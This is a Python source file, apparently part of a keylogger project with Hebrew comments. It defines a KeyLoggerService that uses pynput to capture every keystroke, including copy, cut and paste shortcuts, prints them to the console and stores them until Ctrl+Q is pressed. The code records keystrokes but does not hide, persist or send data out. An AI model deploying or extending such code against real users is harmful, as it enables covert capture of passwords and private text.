from abc import ABC, abstractmethod
from typing import List
from KeyLoggerAgent import Listener,logged_keys
from pynput.keyboard import Key, KeyCode, Listener
import time

class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
      pass

     @abstractmethod
     def stop_logging(self) -> None:
      pass

     @abstractmethod
     def get_logged_keys(self):
      pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.keys = set()
        self.logged_keys = []
        self.listener = None

        # special keys
        self.special_keys = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.up': '',
            'Key.right': ' ',
            'Key.left': '',
            'Key.down': '\n',
            'Key.ctrl_l': '<ctrl>',
            '\\x03': '<copy>',
            'Key.backspace': '',
            '\\x18': '<cut>',
            '\\x16': '<paste>'
        }

    def _on_press(self, key):
        self.keys.add(key)

        # עצירה בקיצור דרך Ctrl+Q
        if Key.ctrl_l in self.keys and KeyCode.from_char('q') in self.keys:
            print("\nCtrl+Q pressed - stopping logger")
            self.stop_logging()
            return False  # חשוב! מחזיר False כדי לעצור את ה-Listener

        # "ניקוי וסידור"
        key_str = self.special_keys.get(str(key), str(key))
        key_str = key_str.replace("'", "")
        if not key_str.isalpha() or key_str.isnumeric():
            key_str = f"{key_str} "

        self.logged_keys.append(key_str)
        print(key_str, end="", flush=True)

    def _on_release(self, key):
        self.keys.discard(key)

    def start_logging(self):
        self.listener = Listener(on_press=self._on_press, on_release=self._on_release)
        self.listener.start()


    def stop_logging(self):

        self.listener.stop()

    def get_logged_keys(self):
        return list(self.logged_keys)


if __name__ == "__main__":
    service = KeyLoggerService()
    service.start_logging()

    try:
        while True:
            time.sleep(0.01)
    except KeyboardInterrupt:
        service.stop_logging()
        print("\nStopped logging.")
        print("Logged keys:", "".join(service.get_logged_keys()))